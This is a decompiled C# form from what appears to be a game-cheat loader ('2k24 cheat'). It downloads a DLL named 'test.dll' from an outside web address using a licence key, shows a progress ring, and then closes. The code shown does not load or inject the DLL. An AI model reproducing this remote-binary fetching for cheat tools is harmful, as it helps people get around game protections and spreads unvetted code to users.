// Decompiled with JetBrains decompiler
// Type: FlameWooLogin.Download
// Assembly: FlameWooLogin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AA57480B-DD63-45C7-B0C5-EDAB3208EC55
// Assembly location: C:\Users\lucap\Desktop\2k24 cheat\NEX.exe

using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;

#nullable disable
namespace FlameWooLogin
{
  public class Download : Form
  {
    private IContainer components;
    private Label label4;
    private Label label3;
    private Label label1;
    private Guna2CircleProgressBar guna2CircleProgressBar1;
    private Label label2;
    private Guna2ControlBox guna2ControlBox2;
    private Guna2ControlBox guna2ControlBox1;
    private Guna2DragControl guna2DragControl1;

    public Download() => this.InitializeComponent();

    private async void Download_Load(object sender, EventArgs e)
    {
      Download download = this;
      download.label1.Font = Form1.CustomFont;
      download.label2.Font = Form1.DownloadFont;
      download.label3.Font = Form1.DownloadFont;
      download.label4.Font = Form1.DownloadFont;
      string downloadUrl = "https://mail.pixeldunks.com/test.dll";
      Program.DownloadFileDelegate downloadFileDel = Program.GetDownloadFileDelegate("downloadFile");
      if (await Task.Run<bool>((Func<bool>) (() =>
      {
        Program.ProgressCallback callback = (Program.ProgressCallback) ((percentage, speed, downloadedMB, totalMB) => this.Invoke((Delegate) (() =>
        {
          this.label3.Text = string.Format("Current Size: {0:0.00}MB", (object) downloadedMB);
          this.label4.Text = string.Format("Total Size: {0:0.00}MB", (object) totalMB);
          this.guna2CircleProgressBar1.Value = (int) (percentage * 100.0);
          this.label2.Text = string.Format("{0:0.00%}", (object) percentage);
        })));
        return downloadFileDel(Form1.allkey, downloadUrl, callback);
      })))
      {
        download.Invoke((Delegate) (() =>
        {
          this.guna2CircleProgressBar1.Value = 100;
          this.label2.Text = "100%";
        }));
        await Task.Delay(3000);
        download.Invoke((Delegate) (() => Application.Exit()));
      }
      else
      {
        int num = (int) MessageBox.Show("Download failed.");
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.label4 = new Label();
      this.label3 = new Label();
      this.label1 = new Label();
      this.guna2CircleProgressBar1 = new Guna2CircleProgressBar();
      this.label2 = new Label();
      this.guna2ControlBox2 = new Guna2ControlBox();
      this.guna2ControlBox1 = new Guna2ControlBox();
      this.guna2DragControl1 = new Guna2DragControl(this.components);
      ((Control) this.guna2CircleProgressBar1).SuspendLayout();
      this.SuspendLayout();
      this.label4.AutoSize = true;
      this.label4.ForeColor = Color.White;
      this.label4.Location = new Point(101, 426);
      this.label4.Name = "label4";
      this.label4.Size = new Size(113, 12);
      this.label4.TabIndex = 18;
      this.label4.Text = "Total size: 0.00MB";
      this.label3.AutoSize = true;
      this.label3.ForeColor = Color.White;
      this.label3.Location = new Point(77, 386);
      this.label3.Name = "label3";
      this.label3.Size = new Size(125, 12);
      this.label3.TabIndex = 17;
      this.label3.Text = "Current Size: 0.00MB";
      this.label1.AutoSize = true;
      this.label1.ForeColor = Color.White;
      this.label1.Location = new Point(91, 83);
      this.label1.Name = "label1";
      this.label1.Size = new Size(65, 12);
      this.label1.TabIndex = 16;
      this.label1.Text = "Downloding";
      ((Control) this.guna2CircleProgressBar1).BackColor = Color.Transparent;
      ((Control) this.guna2CircleProgressBar1).Controls.Add((Control) this.label2);
      this.guna2CircleProgressBar1.FillColor = Color.FromArgb(200, 213, 218, 223);
      this.guna2CircleProgressBar1.FillOffset = 3;
      this.guna2CircleProgressBar1.FillThickness = 15;
      ((Control) this.guna2CircleProgressBar1).Font = new Font("Segoe UI", 12f);
      ((Control) this.guna2CircleProgressBar1).ForeColor = Color.Transparent;
      ((Control) this.guna2CircleProgressBar1).Location = new Point(64, 149);
      this.guna2CircleProgressBar1.Minimum = 0;
      ((Control) this.guna2CircleProgressBar1).Name = "guna2CircleProgressBar1";
      this.guna2CircleProgressBar1.ProgressThickness = 15;
      this.guna2CircleProgressBar1.ShadowDecoration.Mode = (ShadowMode) 1;
      ((Control) this.guna2CircleProgressBar1).Size = new Size(203, 203);
      ((Control) this.guna2CircleProgressBar1).TabIndex = 15;
      ((Control) this.guna2CircleProgressBar1).Text = "guna2CircleProgressBar1";
      this.label2.AutoSize = true;
      this.label2.ForeColor = Color.White;
      this.label2.Location = new Point(85, 89);
      this.label2.Name = "label2";
      this.label2.Size = new Size(32, 21);
      this.label2.TabIndex = 10;
      this.label2.Text = "0%";
      ((Control) this.guna2ControlBox2).Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.guna2ControlBox2.ControlBoxType = (ControlBoxType) 0;
      this.guna2ControlBox2.FillColor = Color.FromArgb(0, 9, 43);
      this.guna2ControlBox2.IconColor = Color.White;
      ((Control) this.guna2ControlBox2).Location = new Point(240, 12);
      ((Control) this.guna2ControlBox2).Name = "guna2ControlBox2";
      ((Control) this.guna2ControlBox2).Size = new Size(35, 26);
      ((Control) this.guna2ControlBox2).TabIndex = 14;
      ((Control) this.guna2ControlBox1).Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.guna2ControlBox1.FillColor = Color.FromArgb(0, 9, 43);
      this.guna2ControlBox1.HoverState.FillColor = Color.Red;
      this.guna2ControlBox1.IconColor = Color.White;
      ((Control) this.guna2ControlBox1).Location = new Point(281, 12);
      ((Control) this.guna2ControlBox1).Name = "guna2ControlBox1";
      ((Control) this.guna2ControlBox1).Size = new Size(35, 26);
      ((Control) this.guna2ControlBox1).TabIndex = 13;
      this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
      this.guna2DragControl1.TargetControl = (Control) this;
      this.guna2DragControl1.UseTransparentDrag = true;
      this.AutoScaleDimensions = new SizeF(6f, 12f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.FromArgb(17, 20, 29);
      this.ClientSize = new Size(328, 495);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.guna2CircleProgressBar1);
      this.Controls.Add((Control) this.guna2ControlBox2);
      this.Controls.Add((Control) this.guna2ControlBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Download);
      this.Text = nameof (Download);
      this.Load += new EventHandler(this.Download_Load);
      ((Control) this.guna2CircleProgressBar1).ResumeLayout(false);
      ((Control) this.guna2CircleProgressBar1).PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
